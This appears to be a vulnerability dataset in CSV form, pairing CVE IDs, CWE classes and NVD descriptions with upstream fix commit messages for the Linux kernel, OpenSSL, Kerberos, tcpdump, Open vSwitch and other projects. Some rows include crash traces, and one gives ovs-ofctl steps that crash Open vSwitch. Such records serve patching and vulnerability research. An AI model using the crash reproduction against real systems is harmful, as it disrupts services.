CVE-2010-5328,CWE-20,2017-02-06,"include/linux/init_task.h in the Linux kernel before 2.6.35 does not prevent signals with a process group ID of zero from reaching the swapper process, which allows local users to cause a denial of service (system crash) by leveraging access to this process group.","""statically initialize struct pid for swapper"" commit 820e45d says:  	Statically initialize a struct pid for the swapper process (pid_t == 0) 	and attach it to init_task.  This is needed so task_pid(), task_pgrp() 	and task_session() interfaces work on the swapper process also.  OK, but:  	- it doesn't make sense to add init_task.pids[].node into 	  init_struct_pid.tasks[], and in fact this just wrong.  	  idle threads are special, they shouldn't be visible on any 	  global list. In particular do_each_pid_task(init_struct_pid) 	  shouldn't see swapper.  	  This is the actual reason why kill(0, SIGKILL) from /sbin/init 	  (which starts with 0,0 special pids) crashes the kernel. The 	  signal sent to pgid/sid == 0 must never see idle threads, even 	  if the previous patch fixed the crash itself.  	- we have other idle threads running on the non-boot CPUs, see 	  the next patch.  Change INIT_STRUCT_PID/INIT_PID_LINK to create the empty/unhashed hlist_head/hlist_node. Like any other idle thread swapper can never exit, so detach_pid()->__hlist_del() is not possible, but we could change INIT_PID_LINK() to set pprev = &next if needed.  All we need is the valid swapper->pids[].pid == &init_struct_pid.  Reported-by: Mathias Krause <mathias.krause@secunet.com> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Cc: Cedric Le Goater <clg@fr.ibm.com> Cc: Dave Hansen <haveblue@us.ibm.com> Cc: Eric Biederman <ebiederm@xmission.com> Cc: Herbert Poetzl <herbert@13thfloor.at> Cc: Mathias Krause <Mathias.Krause@secunet.com> Acked-by: Roland McGrath <roland@redhat.com> Acked-by: Serge Hallyn <serue@us.ibm.com> Cc: Sukadev Bhattiprolu <sukadev@us.ibm.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-8955,CWE-264,2016-10-10,arch/arm64/kernel/perf_event.c in the Linux kernel before 4.1 on arm64 platforms allows local users to gain privileges or cause a denial of service (invalid pointer dereference) via vectors involving events that are mishandled during a span of multiple HW PMUs.,"The perf core implicitly rejects events spanning multiple HW PMUs, as in these cases the event->ctx will differ. However this validation is performed after pmu::event_init() is called in perf_init_event(), and thus pmu::event_init() may be called with a group leader from a different HW PMU.  The ARM64 PMU driver does not take this fact into account, and when validating groups assumes that it can call to_arm_pmu(event->pmu) for any HW event. When the event in question is from another HW PMU this is wrong, and results in dereferencing garbage.  This patch updates the ARM64 PMU driver to first test for and reject events from other PMUs, moving the to_arm_pmu and related logic after this test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with a CCI PMU present:  Bad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL) CPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249 Hardware name: V2F-1XV7 Cortex-A53x2 SMM (DT) task: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000 PC is at 0x0 LR is at validate_event+0x90/0xa8 pc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145 sp : ffffffc07b0a3ba0  [<          (null)>]           (null) [<ffffffc0000907d8>] armpmu_event_init+0x174/0x3cc [<ffffffc00015d870>] perf_try_init_event+0x34/0x70 [<ffffffc000164094>] perf_init_event+0xe0/0x10c [<ffffffc000164348>] perf_event_alloc+0x288/0x358 [<ffffffc000164c5c>] SyS_perf_event_open+0x464/0x98c Code: bad PC value  Also cleans up the code to use the arm_pmu only when we know that we are dealing with an arm pmu event.  Cc: Will Deacon <will.deacon@arm.com> Acked-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Peter Ziljstra (Intel) <peterz@infradead.org> Signed-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com>"
CVE-2019-17178,CWE-252,2019-10-04,"HuffmanTree_makeFromFrequencies in lodepng.c in LodePNG through 2019-09-28, as used in WinPR in FreeRDP and other products, has a memory leak because a supplied realloc pointer (i.e., the first argument to realloc) is also used for a realloc return value.",
CVE-2013-6449,CWE-310,2013-12-23,"The ssl_get_algorithm2 function in ssl/s3_lib.c in OpenSSL before 1.0.2 obtains a certain version number from an incorrect data structure, which allows remote attackers to cause a denial of service (daemon crash) via crafted traffic from a TLS 1.2 client.",
CVE-2018-11743,CWE-824,2018-06-05,"The init_copy function in kernel.c in mruby 1.4.1 makes initialize_copy calls for TT_ICLASS objects, which allows attackers to cause a denial of service (mrb_hash_keys uninitialized pointer and application crash) or possibly have unspecified other impact.",Since `TT_ICLASS` is a internal object that should never be revealed to Ruby world.
CVE-2019-6974,CWE-362,2019-02-15,"In the Linux kernel before 4.20.8, kvm_ioctl_create_device in virt/kvm/kvm_main.c mishandles reference counting because of a race condition, leading to a use-after-free.","kvm_ioctl_create_device() does the following:  1. creates a device that holds a reference to the VM object (with a borrowed    reference, the VM's refcount has not been bumped yet) 2. initializes the device 3. transfers the reference to the device to the caller's file descriptor table 4. calls kvm_get_kvm() to turn the borrowed reference to the VM into a real    reference  The ownership transfer in step 3 must not happen before the reference to the VM becomes a proper, non-borrowed reference, which only happens in step 4. After step 3, an attacker can close the file descriptor and drop the borrowed reference, which can cause the refcount of the kvm object to drop to zero.  This means that we need to grab a reference for the device before anon_inode_getfd(), otherwise the VM can disappear from under us.  Fixes: 852b6d5 (""kvm: add device control API"") Cc: stable@kernel.org Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-4118,CWE-476,2016-10-03,FreeRDP before 1.1.0-beta1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via unspecified vectors.,
CVE-2014-9140,CWE-119,2014-12-05,Buffer overflow in the ppp_hdlc function in print-ppp.c in tcpdump 4.6.2 and earlier allows remote attackers to cause a denial of service (crash) cia a crafted PPP packet.,Clean up a const issue while we're at it.
CVE-2014-9423,CWE-200,2015-02-19,"The svcauth_gss_accept_sec_context function in lib/rpc/svc_auth_gss.c in MIT Kerberos 5 (aka krb5) 1.11.x through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 transmits uninitialized interposer data to clients, which allows remote attackers to obtain sensitive information from process heap memory by sniffing the network for data in a handle field.","[MITKRB5-SA-2015-001] In svcauth_gss_accept_sec_context(), do not copy bytes from the union context into the handle field we send to the client.  We do not use this handle field, so just supply a fixed string of ""xxxx"".  In gss_union_ctx_id_struct, remove the unused ""interposer"" field which was causing part of the union context to remain uninitialized.  ticket: 8058 (new) target_version: 1.13.1 tags: pullup"
CVE-2014-3572,CWE-310,2015-01-09,"The ssl3_get_key_exchange function in s3_clnt.c in OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote SSL servers to conduct ECDHE-to-ECDH downgrade attacks and trigger a loss of forward secrecy by omitting the ServerKeyExchange message.",Fix bug where an OpenSSL client would accept a handshake using an ephemeral ECDH ciphersuites with the server key exchange message omitted.  Thanks to Karthikeyan Bhargavan for reporting this issue.  CVE-2014-3572 Reviewed-by: Matt Caswell <matt@openssl.org>
CVE-2019-13137,CWE-401,2019-07-01,ImageMagick before 7.0.8-50 has a memory leak vulnerability in the function ReadPSImage in coders/ps.c.,
CVE-2018-7254,CWE-125,2018-02-19,"The ParseCaffHeaderConfig function of the cli/caff.c file of WavPack 5.1.0 allows a remote attacker to cause a denial-of-service (global buffer over-read), or possibly trigger a buffer overflow or incorrect memory allocation, via a maliciously crafted CAF file.",
CVE-2012-6703,CWE-190,2016-06-29,Integer overflow in the snd_compr_allocate_buffer function in sound/core/compress_offload.c in the ALSA subsystem in the Linux kernel before 3.6-rc6-next-20120917 allows local users to cause a denial of service (insufficient memory allocation) or possibly have unspecified other impact via a crafted SNDRV_COMPRESS_SET_PARAMS ioctl call.,"These are 32 bit values that come from the user, we need to check for integer overflows or we could end up allocating a smaller buffer than expected.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2014-3985,,2014-09-11,The getHTTPResponse function in miniwget.c in MiniUPnP 1.9 allows remote attackers to cause a denial of service (crash) via crafted headers that trigger an out-of-bounds read.,
CVE-2018-11363,CWE-125,2018-05-22,jpeg_size in pdfgen.c in PDFGen before 2018-04-09 has a heap-based buffer over-read.,Found via the clang libfuzzer
CVE-2019-15923,CWE-476,2019-09-04,An issue was discovered in the Linux kernel before 5.0.9. There is a NULL pointer dereference for a cd data structure if alloc_disk fails in drivers/block/paride/pf.c.,"Syzkaller report this:  pcd: pcd version 1.07, major 46, nice 0 pcd0: Autoprobe failed pcd: No CD-ROM drive found kasan: CONFIG_KASAN_INLINE enabled kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN PTI CPU: 1 PID: 4525 Comm: syz-executor.0 Not tainted 5.1.0-rc3+ #8 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 RIP: 0010:pcd_init+0x95c/0x1000 [pcd] Code: c4 ab f7 48 89 d8 48 c1 e8 03 80 3c 28 00 74 08 48 89 df e8 56 a3 da f7 4c 8b 23 49 8d bc 24 80 05 00 00 48 89 f8 48 c1 e8 03 <80> 3c 28 00 74 05 e8 39 a3 da f7 49 8b bc 24 80 05 00 00 e8 cc b2 RSP: 0018:ffff8881e84df880 EFLAGS: 00010202 RAX: 00000000000000b0 RBX: ffffffffc155a088 RCX: ffffffffc1508935 RDX: 0000000000040000 RSI: ffffc900014f0000 RDI: 0000000000000580 RBP: dffffc0000000000 R08: ffffed103ee658b8 R09: ffffed103ee658b8 R10: 0000000000000001 R11: ffffed103ee658b7 R12: 0000000000000000 R13: ffffffffc155a778 R14: ffffffffc155a4a8 R15: 0000000000000003 FS:  00007fe71bee3700(0000) GS:ffff8881f7300000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 000055a7334441a8 CR3: 00000001e9674003 CR4: 00000000007606e0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400 PKRU: 55555554 Call Trace:  ? 0xffffffffc1508000  ? 0xffffffffc1508000  do_one_initcall+0xbc/0x47d init/main.c:901  do_init_module+0x1b5/0x547 kernel/module.c:3456  load_module+0x6405/0x8c10 kernel/module.c:3804  __do_sys_finit_module+0x162/0x190 kernel/module.c:3898  do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007fe71bee2c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139 RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 0000000020000180 RDI: 0000000000000003 RBP: 00007fe71bee2c70 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007fe71bee36bc R13: 00000000004bcefa R14: 00000000006f6fb0 R15: 0000000000000004 Modules linked in: pcd(+) paride solos_pci atm ts_fsm rtc_mt6397 mac80211 nhc_mobility nhc_udp nhc_ipv6 nhc_hop nhc_dest nhc_fragment nhc_routing 6lowpan rtc_cros_ec memconsole intel_xhci_usb_role_switch roles rtc_wm8350 usbcore industrialio_triggered_buffer kfifo_buf industrialio asc7621 dm_era dm_persistent_data dm_bufio dm_mod tpm gnss_ubx gnss_serial serdev gnss max2165 cpufreq_dt hid_penmount hid menf21bmc_wdt rc_core n_tracesink ide_gd_mod cdns_csi2tx v4l2_fwnode videodev media pinctrl_lewisburg pinctrl_intel iptable_security iptable_raw iptable_mangle iptable_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 iptable_filter bpfilter ip6_vti ip_vti ip_gre ipip sit tunnel4 ip_tunnel hsr veth netdevsim vxcan batman_adv cfg80211 rfkill chnl_net caif nlmon dummy team bonding vcan bridge stp llc ip6_gre gre ip6_tunnel tunnel6 tun joydev mousedev ppdev kvm_intel kvm irqbypass crct10dif_pclmul crc32_pclmul crc32c_intel ghash_clmulni_intel aesni_intel aes_x86_64 crypto_simd  ide_pci_generic piix input_leds cryptd glue_helper psmouse ide_core intel_agp serio_raw intel_gtt ata_generic i2c_piix4 agpgart pata_acpi parport_pc parport floppy rtc_cmos sch_fq_codel ip_tables x_tables sha1_ssse3 sha1_generic ipv6 [last unloaded: bmc150_magn] Dumping ftrace buffer:    (ftrace buffer empty) ---[ end trace d873691c3cd69f56 ]---  If alloc_disk fails in pcd_init_units, cd->disk will be NULL, however in pcd_detect and pcd_exit, it's not check this before free.It may result a NULL pointer dereference.  Also when register_blkdev failed, blk_cleanup_queue() and blk_mq_free_tag_set() should be called to free resources.  Reported-by: Hulk Robot <hulkci@huawei.com> Fixes: 81b74ac (""paride/pcd: cleanup queues when detection fails"") Signed-off-by: YueHaibing <yuehaibing@huawei.com>  Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2018-13785,CWE-190,2018-07-09,"In libpng 1.6.34, a wrong calculation of row_factor in the png_check_chunk_length function (pngrutil.c) may trigger an integer overflow and resultant divide-by-zero while processing a crafted PNG file, leading to a denial of service.","(Bug report by Thuan Pham, SourceForge issue #278)"
CVE-2013-4483,CWE-189,2013-11-04,"The ipc_rcu_putref function in ipc/util.c in the Linux kernel before 3.10 does not properly manage a reference count, which allows local users to cause a denial of service (memory consumption or system crash) via a crafted application.","Introduce finer grained locking for semtimedop, to handle the common case of a program wanting to manipulate one semaphore from an array with multiple semaphores.  If the call is a semop manipulating just one semaphore in an array with multiple semaphores, only take the lock for that semaphore itself.  If the call needs to manipulate multiple semaphores, or another caller is in a transaction that manipulates multiple semaphores, the sem_array lock is taken, as well as all the locks for the individual semaphores.  On a 24 CPU system, performance numbers with the semop-multi test with N threads and N semaphores, look like this:  	vanilla		Davidlohr's	Davidlohr's +	Davidlohr's + threads			patches		rwlock patches	v3 patches 10	610652		726325		1783589 2142206 20	341570		365699		1520453		1977878 30	288102		307037		1498167		2037995 40	290714		305955		1612665 2256484 50	288620		312890		1733453		2650292 60	289987		306043		1649360		2388008 70	291298		306347		1723167		2717486 80	290948		305662		1729545		2763582 90	290996		306680		1736021		2757524 100	292243		306700		1773700		3059159  [davidlohr.bueso@hp.com: do not call sem_lock when bogus sma] [davidlohr.bueso@hp.com: make refcounter atomic] Signed-off-by: Rik van Riel <riel@redhat.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: Davidlohr Bueso <davidlohr.bueso@hp.com> Cc: Chegu Vinod <chegu_vinod@hp.com> Cc: Jason Low <jason.low2@hp.com> Reviewed-by: Michel Lespinasse <walken@google.com> Cc: Peter Hurley <peter@hurleysoftware.com> Cc: Stanislav Kinsbursky <skinsbursky@parallels.com> Tested-by: Emmanuel Benisty <benisty.e@gmail.com> Tested-by: Sedat Dilek <sedat.dilek@gmail.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-10360,CWE-125,2018-06-11,The do_core_note function in readelf.c in libmagic.a in file 5.33 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted ELF file.,
CVE-2016-9191,CWE-20,2016-11-28,"The cgroup offline implementation in the Linux kernel through 4.8.11 mishandles certain drain operations, which allows local users to cause a denial of service (system hang) by leveraging access to a container environment for executing a crafted application, as demonstrated by trinity.","Fixes CVE-2016-9191, proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. It can cause any path called unregister_sysctl_table will wait forever.  The calltrace of CVE-2016-9191:  [ 5535.960522] Call Trace: [ 5535.963265]  [<ffffffff817cdaaf>] schedule+0x3f/0xa0 [ 5535.968817]  [<ffffffff817d33fb>] schedule_timeout+0x3db/0x6f0 [ 5535.975346]  [<ffffffff817cf055>] ? wait_for_completion+0x45/0x130 [ 5535.982256]  [<ffffffff817cf0d3>] wait_for_completion+0xc3/0x130 [ 5535.988972]  [<ffffffff810d1fd0>] ? wake_up_q+0x80/0x80 [ 5535.994804]  [<ffffffff8130de64>] drop_sysctl_table+0xc4/0xe0 [ 5536.001227]  [<ffffffff8130de17>] drop_sysctl_table+0x77/0xe0 [ 5536.007648]  [<ffffffff8130decd>] unregister_sysctl_table+0x4d/0xa0 [ 5536.014654]  [<ffffffff8130deff>] unregister_sysctl_table+0x7f/0xa0 [ 5536.021657]  [<ffffffff810f57f5>] unregister_sched_domain_sysctl+0x15/0x40 [ 5536.029344]  [<ffffffff810d7704>] partition_sched_domains+0x44/0x450 [ 5536.036447]  [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111/0x1f0 [ 5536.043844]  [<ffffffff81167684>] rebuild_sched_domains_locked+0x64/0xb0 [ 5536.051336]  [<ffffffff8116789d>] update_flag+0x11d/0x210 [ 5536.057373]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.064186]  [<ffffffff81167acb>] ? cpuset_css_offline+0x1b/0x60 [ 5536.070899]  [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd/0x10 [ 5536.077420]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.084234]  [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25/0x220 [ 5536.091049]  [<ffffffff81167ae5>] cpuset_css_offline+0x35/0x60 [ 5536.097571]  [<ffffffff8115aa2c>] css_killed_work_fn+0x5c/0x220 [ 5536.104207]  [<ffffffff810bc83f>] process_one_work+0x1df/0x710 [ 5536.110736]  [<ffffffff810bc7c0>] ? process_one_work+0x160/0x710 [ 5536.117461]  [<ffffffff810bce9b>] worker_thread+0x12b/0x4a0 [ 5536.123697]  [<ffffffff810bcd70>] ? process_one_work+0x710/0x710 [ 5536.130426]  [<ffffffff810c3f7e>] kthread+0xfe/0x120 [ 5536.135991]  [<ffffffff817d4baf>] ret_from_fork+0x1f/0x40 [ 5536.142041]  [<ffffffff810c3e80>] ? kthread_create_on_node+0x230/0x230  One cgroup maintainer mentioned that ""cgroup is trying to offline a cpuset css, which takes place under cgroup_mutex.  The offlining ends up trying to drain active usages of a sysctl table which apprently is not happening."" The real reason is that proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. So this cpuset offline path will wait here forever.  See here for details: http://www.openwall.com/lists/oss-security/2016/11/04/13  Fixes: f0c3b50 (""[readdir] convert procfs"") Cc: stable@vger.kernel.org Reported-by: CAI Qian <caiqian@redhat.com> Tested-by: Yang Shukui <yangshukui@huawei.com> Signed-off-by: Zhou Chengming <zhouchengming1@huawei.com> Acked-by: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>"
CVE-2015-6031,CWE-119,2015-11-02,"Buffer overflow in the IGDstartelt function in igd_desc_parse.c in the MiniUPnP client (aka MiniUPnPc) before 1.9.20150917 allows remote UPNP servers to cause a denial of service (application crash) and possibly execute arbitrary code via an ""oversized"" XML element name.",
CVE-2017-12987,CWE-125,2017-09-14,The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().,The arguments to memcpy() were completely wrong.  This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by Brian 'geeknik' Carpenter.
CVE-2018-14015,CWE-119,2018-07-12,The sdb_set_internal function in sdb.c in radare2 2.7.0 allows remote attackers to cause a denial of service (invalid read and application crash) via a crafted ELF file because of missing input validation in r_bin_dwarf_parse_comp_unit in libr/bin/dwarf.c.,
CVE-2014-5351,CWE-255,2014-10-10,"The kadm5_randkey_principal_3 function in lib/kadm5/srv/svr_principal.c in kadmind in MIT Kerberos 5 (aka krb5) before 1.13 sends old keys in a response to a -randkey -keepold request, which allows remote authenticated users to forge tickets by leveraging administrative access.","In kadmind's randkey operation, if a client specifies the keepold flag, do not include the preserved old keys in the response.  CVE-2014-5351:  An authenticated remote attacker can retrieve the current keys for a service principal when generating a new set of keys for that principal.  The attacker needs to be authenticated as a user who has the elevated privilege for randomizing the keys of other principals.  Normally, when a Kerberos administrator randomizes the keys of a service principal, kadmind returns only the new keys.  This prevents an administrator who lacks legitimate privileged access to a service from forging tickets to authenticate to that service.  If the ""keepold"" flag to the kadmin randkey RPC operation is true, kadmind retains the old keys in the KDC database as intended, but also unexpectedly returns the old keys to the client, which exposes the service to ticket forgery attacks from the administrator.  A mitigating factor is that legitimate clients of the affected service will start failing to authenticate to the service once they begin to receive service tickets encrypted in the new keys.  The affected service will be unable to decrypt the newly issued tickets, possibly alerting the legitimate administrator of the affected service.  CVSSv2: AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C  [tlyu@mit.edu: CVE description and CVSS score]  ticket: 8018 (new) target_version: 1.13 tags: pullup"
CVE-2011-4913,CWE-20,2012-06-21,"The rose_parse_ccitt function in net/rose/rose_subr.c in the Linux kernel before 2.6.39 does not validate the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP fields, which allows remote attackers to (1) cause a denial of service (integer underflow, heap memory corruption, and panic) via a small length value in data sent to a ROSE socket, or (2) conduct stack-based buffer overflow attacks via a large length value in data sent to a ROSE socket.","When parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for a remote host to provide more digipeaters than expected, resulting in heap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and abort facilities parsing on failure.  Additionally, when parsing the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length of less than 10, resulting in an underflow in a memcpy size, causing a kernel panic due to massive heap corruption.  A length of greater than 20 results in a stack overflow of the callsign array.  Abort facilities parsing on these invalid length values.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-2119,CWE-119,2013-01-22,"Buffer overflow in the macvtap device driver in the Linux kernel before 3.4.5, when running in certain configurations, allows privileged KVM guest users to cause a denial of service (crash) via a long descriptor with a long vector length.",There're several reasons that the vectors need to be validated:  - Return error when caller provides vectors whose num is greater than UIO_MAXIOV. - Linearize part of skb when userspace provides vectors grater than MAX_SKB_FRAGS. - Return error when userspace provides vectors whose total length may exceed - MAX_SKB_FRAGS * PAGE_SIZE.  Signed-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>
CVE-2017-6348,,2017-03-01,"The hashbin_delete function in net/irda/irqueue.c in the Linux kernel before 4.9.13 improperly manages lock dropping, which allows local users to cause a denial of service (deadlock) via crafted operations on IrDA devices.",A nested lock depth was added to the hasbin_delete() code but it doesn't actually work some well and results in tons of lockdep splats.  Fix the code instead to properly drop the lock around the operation and just keep peeking the head of the hashbin queue.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-17205,CWE-617,2018-09-19,"An issue was discovered in Open vSwitch (OvS) 2.7.x through 2.7.6, affecting ofproto_rule_insert__ in ofproto/ofproto.c. During bundle commit, flows that are added in a bundle are applied to ofproto in order. If a flow cannot be added (e.g., the flow action is a go-to for a group id that does not exist), OvS tries to revert back all previous flows that were successfully applied from the same bundle. This is possible since OvS maintains list of old flows that were replaced by flows from the bundle. While reinserting old flows, OvS has an assertion failure due to a check on rule state != RULE_INITIALIZED. This would work for new flows, but for an old flow the rule state is RULE_REMOVED. The assertion failure causes an OvS crash.","During bundle commit flows which are added in bundle are applied to ofproto in-order. In case if a flow cannot be added (e.g. flow action is go-to group id which does not exist), OVS tries to revert back all previous flows which were successfully applied from the same bundle. This is possible since OVS maintains list of old flows which were replaced by flows from the bundle.  While reinserting old flows ovs asserts due to check on rule state != RULE_INITIALIZED.  This will work only for new flows, but for old flow the rule state will be RULE_REMOVED. This is causing an assert and OVS crash.  The ovs assert check should be modified to != RULE_INSERTED to prevent any existing rule being re-inserted and allow new rules and old rules (in case of revert) to get inserted.  Here is an example to trigger the assert:  $ ovs-vsctl add-br br-test -- set Bridge br-test datapath_type=netdev  $ cat flows.txt flow add table=1,priority=0,in_port=2,actions=NORMAL flow add table=1,priority=0,in_port=3,actions=NORMAL  $ ovs-ofctl dump-flows -OOpenflow13 br-test  cookie=0x0, duration=2.465s, table=1, n_packets=0, n_bytes=0, priority=0,in_port=2 actions=NORMAL  cookie=0x0, duration=2.465s, table=1, n_packets=0, n_bytes=0, priority=0,in_port=3 actions=NORMAL  $ cat flow-modify.txt flow modify table=1,priority=0,in_port=2,actions=drop flow modify table=1,priority=0,in_port=3,actions=group:10  $ ovs-ofctl bundle br-test flow-modify.txt -OOpenflow13  First flow rule will be modified since it is a valid rule. However second rule is invalid since no group with id 10 exists. Bundle commit tries to revert (insert) the first rule to old flow which results in ovs_assert at ofproto_rule_insert__() since old rule->state = RULE_REMOVED.  Signed-off-by: Vishal Deep Ajmera <vishal.deep.ajmera@ericsson.com> Signed-off-by: Ben Pfaff <blp@ovn.org>"
CVE-2017-12641,CWE-772,2017-08-07,ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadOneJNGImage in coders\png.c.,
CVE-2012-6546,CWE-200,2013-03-15,"The ATM implementation in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.",The ATM code fails to initialize the two padding bytes of struct sockaddr_atmpvc inserted for alignment. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2019-10131,CWE-193,2019-04-30,An off-by-one read vulnerability was discovered in ImageMagick before version 7.0.7-28 in the formatIPTCfromBuffer function in coders/meta.c. A local attacker may use this flaw to read beyond the end of the buffer or to crash the program.,
CVE-2017-13040,CWE-125,2017-09-14,"The MPTCP parser in tcpdump before 4.9.2 has a buffer over-read in print-mptcp.c, several functions.","Do the length checking inline; that means we print stuff up to the point at which we run out of option data.  First check to make sure we have at least 4 bytes of option, so we have flags to check.  This fixes a buffer over-read discovered by Kim Gwan Yeong.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-5847,CWE-125,2017-02-09,The gst_asf_demux_process_ext_content_desc function in gst/asfdemux/gstasfdemux.c in gst-plugins-ugly in GStreamer allows remote attackers to cause a denial of service (out-of-bounds heap read) via vectors involving extended content descriptors.,https://bugzilla.gnome.org/show_bug.cgi?id=777955
CVE-2013-1417,CWE-20,2013-11-20,"do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) 1.11 before 1.11.4, when a single-component realm name is used, allows remote authenticated users to cause a denial of service (daemon crash) via a TGS-REQ request that triggers an attempted cross-realm referral for a host-based service principal.","An authenticated remote client can cause a KDC to crash by making a valid TGS-REQ to a KDC serving a realm with a single-component name. The process_tgs_req() function dereferences a null pointer because an unusual failure condition causes a helper function to return success.  While attempting to provide cross-realm referrals for host-based service principals, the find_referral_tgs() function could return a TGS principal for a zero-length realm name (indicating that the hostname in the service principal has no known realm associated with it).  Subsequently, the find_alternate_tgs() function would attempt to construct a path to this empty-string realm, and return success along with a null pointer in its output parameter.  This happens because krb5_walk_realm_tree() returns a list of length one when it attempts to construct a transit path between a single-component realm and the empty-string realm.  This list causes a loop in find_alternate_tgs() to iterate over zero elements, resulting in the unexpected output of a null pointer, which process_tgs_req() proceeds to dereference because there is no error condition.  Add an error condition to find_referral_tgs() when krb5_get_host_realm() returns an empty realm name.  Also add an error condition to find_alternate_tgs() to handle the length-one output from krb5_walk_realm_tree().  The vulnerable configuration is not likely to arise in practice. (Realm names that have a single component are likely to be test realms.)  Releases prior to krb5-1.11 are not vulnerable.  Thanks to Sol Jerome for reporting this problem.  CVSSv2: AV:N/AC:M/Au:S/C:N/I:N/A:P/E:H/RL:O/RC:C  (cherry picked from commit 3c7f1c2)  ticket: 7668 version_fixed: 1.11.4 status: resolved"
CVE-2014-3690,CWE-400,2014-11-10,"arch/x86/kvm/vmx.c in the KVM subsystem in the Linux kernel before 3.17.2 on Intel processors does not ensure that the value in the CR4 control register remains the same after a VM entry, which allows host OS users to kill arbitrary processes or cause a denial of service (system disruption) by leveraging /dev/kvm access, as demonstrated by PR_SET_TSC prctl calls within a modified copy of QEMU.","CR4 isn't constant; at least the TSD and PCE bits can vary.  TBH, treating CR0 and CR3 as constant scares me a bit, too, but it looks like it's correct.  This adds a branch and a read from cr4 to each vm entry.  Because it is extremely likely that consecutive entries into the same vcpu will have the same host cr4 value, this fixes up the vmcs instead of restoring cr4 after the fact.  A subsequent patch will add a kernel-wide cr4 shadow, reducing the overhead in the common case to just two memory reads and a branch.  Signed-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: Paolo Bonzini <pbonzini@redhat.com> Cc: stable@vger.kernel.org Cc: Petr Matousek <pmatouse@redhat.com> Cc: Gleb Natapov <gleb@kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-15385,CWE-119,2017-10-16,The store_versioninfo_gnu_verdef function in libr/bin/format/elf/elf.c in radare2 2.0.0 allows remote attackers to cause a denial of service (r_read_le16 invalid write and application crash) or possibly have unspecified other impact via a crafted ELF file.,
